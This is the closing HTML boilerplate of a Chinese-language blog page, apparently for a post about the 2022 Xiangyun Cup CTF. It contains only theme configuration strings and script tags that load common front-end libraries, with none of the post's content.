LOCAL={path:"2022/11/09/match/祥云杯/",favicon:{show:"(*╹▽╹*)土豪我们做朋友好不好",hide:"你是猪吗^(*￣(oo)￣)^"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,copy_tex:!0,katex:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->